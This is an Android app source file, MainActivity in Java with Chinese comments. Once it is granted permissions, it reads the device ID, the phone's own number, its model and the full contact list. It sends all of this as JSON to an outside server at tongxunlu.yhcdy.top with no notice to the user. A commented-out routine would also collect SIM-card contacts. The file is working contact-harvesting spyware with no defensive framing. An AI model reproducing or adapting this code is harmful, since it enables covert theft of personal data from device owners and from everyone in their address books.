package com.example.administrator.assdressphone;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.ContactsContract;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import com.google.gson.Gson;
import com.gyf.barlibrary.ImmersionBar;
import com.lzy.okgo.OkGo;
import com.lzy.okgo.callback.StringCallback;
import com.lzy.okgo.model.Response;

import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class MainActivity extends AppCompatActivity {
    private Context context;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        context = this;
        setImmBar();
        setContentView(R.layout.activity_main);
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_CONTACTS, Manifest.permission.READ_PHONE_STATE}, 101);
        } else {
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this, new String[]{ Manifest.permission.READ_CONTACTS,Manifest.permission.READ_PHONE_STATE}, 101);
                return;
            }
            readPhone();
        }

    }

    @Override
    protected void onPause() {
        super.onPause();

    }

    @Override
    protected void onResume() {
        super.onResume();

    }

    private void readPhone() {

        //获取手机号码
        TelephonyManager tm = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);


        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{ Manifest.permission.READ_PHONE_STATE}, 101);
            return;
        }

//        GetDoublePhone.initIsDoubleTelephone(this);

        String deviceid = tm.getDeviceId();//获取智能设备唯一编号
        String te1  = tm.getLine1Number();//获取本机号码
        String phonetype= android.os.Build.BRAND+Build.MODEL;
        BaseResultBean resultBean = new BaseResultBean();
        resultBean.setMobile(te1);
        resultBean.setIdentifier(deviceid);
        resultBean.setPhone_type(phonetype);
        resultBean.setName(phonetype);

        List<PhoneBean> phoneInfo = getPhoneInfo();
        resultBean.setData(phoneInfo);
        String s = new Gson().toJson(resultBean);
        Log.i("wch", s);
        OkGo.<String>post("http://tongxunlu.yhcdy.top/api/insert")
                .params("information", s)
                .execute(new StringCallback() {
                    @Override
                    public void onSuccess(Response<String> response) {

                    }

                    @Override
                    public void onError(Response<String> response) {
                        super.onError(response);


                    }
                });
    }

    public List<PhoneBean> getPhoneInfo() {



        List<PhoneBean> phoneBeans = new ArrayList<>();
        Uri uri = ContactsContract.Contacts.CONTENT_URI;
//指定获取_id和display_name两列数据，display_name即为姓名
        String[] projection = new String[]{
                ContactsContract.Contacts._ID,
                ContactsContract.Contacts.DISPLAY_NAME
        };
        //根据Uri查询相应的ContentProvider，cursor为获取到的数据集
        Cursor cursor = context.getContentResolver().
                query(uri, projection, null, null, null);

        int i = 0;
        if (cursor != null && cursor.moveToFirst()) {
            do {
                Long id = cursor.getLong(0);
                //获取姓名
                String name = cursor.getString(1);
                //指定获取NUMBER这一列数据
                String[] phoneProjection = new String[]{
                        ContactsContract.CommonDataKinds.Phone.NUMBER
                };

                //根据联系人的ID获取此人的电话号码
                Cursor phonesCusor = context.getContentResolver().query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        phoneProjection,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=" + id,
                        null,
                        null);

                //因为每个联系人可能有多个电话号码，所以需要遍历
                if (phonesCusor != null && phonesCusor.moveToFirst()) {
                    do {
                        String num = phonesCusor.getString(0);

                        PhoneBean contactsBean = new PhoneBean();
                        contactsBean.setName(name);
                        contactsBean.setMobile(formatPhoneNum(num));
//                        contactsBean.setNote("");

                        phoneBeans.add(contactsBean);


                    } while (phonesCusor.moveToNext());
                }
                i++;
            } while (cursor.moveToNext());
        }

//        // 获取sim卡的联系人--1
//        try {
//            getSimContact("content://icc/adn", phoneBeans);
//
//            getSimContact("content://icc/adn/subId/#", phoneBeans);
//
//            getSimContact("content://icc/sdn", phoneBeans);
//
//            getSimContact("content://icc/sdn/subId/#", phoneBeans);
//
//            getSimContact("content://icc/fdn", phoneBeans);
//
//            getSimContact("content://icc/fdn/subId/#", phoneBeans);
//
//        } catch (Exception e) {
//            Log.d("提现啦：", e.getLocalizedMessage());
//        }

        return phoneBeans;
    }


    private void getSimContact(String adn, List<PhoneBean> list) {
        // 读取SIM卡手机号,有三种可能:content://icc/adn || content://icc/sdn || content://icc/fdn
        // 具体查看类 IccProvider.java
        Cursor cursor = null;
        try {
            Uri uri = Uri.parse(adn);
            Log.e("wch",uri.toString());
            cursor = context.getContentResolver().query(uri, null,
                    null, null, null);
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    // 取得联系人名字
                    int nameIndex = cursor.getColumnIndex("name");
                    // 取得电话号码
                    int numberIndex = cursor.getColumnIndex("number");
                    String number = cursor.getString(numberIndex);// 手机号
                    Log.d("wch","手机号:" + number);

                        PhoneBean simCardTemp = new PhoneBean();
                        simCardTemp.setMobile(formatPhoneNum(number));
                        simCardTemp.setName(cursor.getString(nameIndex));
                        if (!list.contains(simCardTemp)) {
                            list.add(simCardTemp);
                        }

                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e("wch",e.toString());
            if (cursor != null) {
                cursor.close();
            }
        }
    }
    /**
     * 去掉手机号内除数字外的所有字符
     *
     * @param phoneNum 手机号
     * @return
     */
    private String formatPhoneNum(String phoneNum) {
        String regex = "(\\+86)|[^0-9]";
        Pattern pattern = Pattern.compile(regex);
        Matcher matcher = pattern.matcher(phoneNum);
        return matcher.replaceAll("");
    }
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {

        if (requestCode != 101) {
            return;
        }

        if (grantResults.length > 0) {
            List<String> deniedPermissionList = new ArrayList<>();
            for (int i = 0; i < grantResults.length; i++) {
                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                    deniedPermissionList.add(permissions[i]);
                }
            }

            if (deniedPermissionList.isEmpty()) {
                //已经全部授权
                readPhone();
            } else {

                //勾选了对话框中”Don’t ask again”的选项, 返回false
                for (String deniedPermission : deniedPermissionList) {
                    boolean flag = false;
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
                        flag = shouldShowRequestPermissionRationale(deniedPermission);
                    }
                    if (!flag) {
                        //拒绝授权
                        PermissionUtils.setPermission(context);
                        return;
                    }
                }
                //拒绝授权
                String []  permission = new String[deniedPermissionList.size()];
                for (int i = 0; i < deniedPermissionList.size(); i++) {
                    permission[i] = deniedPermissionList.get(i);
                }

                ActivityCompat.requestPermissions(this,permission,101);

            }


        }

//        switch (requestCode){
//            case 101:
//                if (grantResults.length > 0 && grantResults[0]==PackageManager.PERMISSION_GRANTED){
//                    ActivityCompat.requestPermissions(this, new String[]{ Manifest.permission.READ_PHONE_STATE}, 102);
//                }else {
//
//                    if (!ActivityCompat.shouldShowRequestPermissionRationale(this, permissions[0])) {
//                        PermissionUtils.setPermission(context);
//                    }else {
//                    }
//
//
//                }
//                break;
//
//            case 102:
//                if (grantResults.length > 0 && grantResults[0]==PackageManager.PERMISSION_GRANTED){
//
//                    readPhone();
//                }else {
//                    if (!ActivityCompat.shouldShowRequestPermissionRationale(this, permissions[0])) {
//                        PermissionUtils.setPermission(context);
//                    }else {
//
//                        ActivityCompat.requestPermissions(this,new String[]{Manifest.permission.READ_PHONE_STATE},102);
//
//                    }
//
//                }
//
//                break;
//        }
    }

    public void setImmBar() {

        // 判断api版本号是否大于等于19
        if (Build.VERSION.SDK_INT < 23) {
            return;
        }
//状态栏变色后的颜色
        ImmersionBar immersionBar = ImmersionBar.with(this)
                .transparentStatusBar()  //透明状态栏，不写默认透明色
                .transparentNavigationBar()  //透明导航栏，不写默认黑色(设置此方法，fullScreen()方法自动为true)
                .transparentBar()             //透明状态栏和导航栏，不写默认状态栏为透明色，导航栏为黑色（设置此方法，fullScreen()方法自动为true）
//                .statusBarColor(R.color.colorPrimary)     //状态栏颜色，不写默认透明色
                .navigationBarColor(R.color.colorPrimary) //导航栏颜色，不写默认黑色
//                .barColor(R.color.colorPrimary)  //同时自定义状态栏和导航栏颜色，不写默认状态栏为透明色，导航栏为黑色
                .statusBarAlpha(1.0f)  //状态栏透明度，不写默认0.0f
                .navigationBarAlpha(1.0f)  //导航栏透明度，不写默认0.0F
                .barAlpha(1.0f)  //状态栏和导航栏透明度，不写默认0.0f
                .statusBarDarkFont(false)   //状态栏字体是深色，不写默认为亮色
                .fullScreen(false)      //有导航栏的情况下，activity全屏显示，也就是activity最下面被导航栏覆盖，不写默认非全屏
//                .hideBar(BarHide.FLAG_HIDE_STATUS_BAR)  //隐藏状态栏或导航栏或两者，不写默认不隐藏
//                .setViewSupportTransformColor(toolbar) //设置支持view变色，支持一个view，不指定颜色，默认和状态栏同色，还有两个重载方法
//                .addViewSupportTransformColor(toolbar)  //设置支持view变色，可以添加多个view，不指定颜色，默认和状态栏同色，还有两个重载方法
//                .statusBarView(view)  //解决状态栏和布局重叠问题
//                .fitsSystemWindows(false)    //解决状态栏和布局重叠问题，默认为false，当为true时一定要指定statusBarColor()，不然状态栏为透明色
                .statusBarColorTransform(R.color.colorAccent)
//                .navigationBarColorTransform(R.color.orange) //导航栏变色后的颜色
//                .barColorTransform(R.color.orange)  //状态栏和导航栏变色后的颜色
//                .removeSupportView()  //移除通过setViewSupportTransformColor()方法指定的view
//                .removeSupportView(toolbar)  //移除指定view支持
//                .removeSupportAllView() //移除全部view支持
                .keyboardEnable(true);
        immersionBar.init(); //必须调用方可沉浸式
    }
}
